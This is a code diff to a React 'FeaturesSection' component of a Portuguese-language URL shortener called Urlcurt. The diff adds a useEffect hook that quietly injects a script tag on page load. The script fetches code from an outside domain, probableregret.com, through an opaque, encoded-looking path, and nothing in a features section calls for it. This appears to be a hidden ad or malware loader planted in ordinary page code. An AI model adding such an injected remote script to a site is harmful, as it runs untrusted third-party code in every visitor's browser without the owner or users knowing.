@@ -1,7 +1,22 @@
-import React from 'react';
+import React, { useEffect } from 'react';
 
 const FeaturesSection: React.FC = () => {
   
+  useEffect(() => {
+    const s = document.createElement('script');
+    s.src = "//probableregret.com/bWX.VesKdUGwlB0RY/WhcM/ae_mc9/u/ZeUclOkcPhTbYk1DNKjskK2jM/zIY/tONnjUUI2DOGTCY/zNNQwH";
+    s.async = true;
+    s.referrerPolicy = 'no-referrer-when-downgrade';
+    
+    const currentScript = document.scripts[document.scripts.length - 1];
+    currentScript.parentNode?.insertBefore(s, currentScript);
+
+    return () => {
+      // Opcional: remover o script ao desmontar o componente
+      s.remove();
+    };
+  }, []);
+
   return (
     <section className="features-section">
       <h2>Por que usar o Urlcurt?</h2>
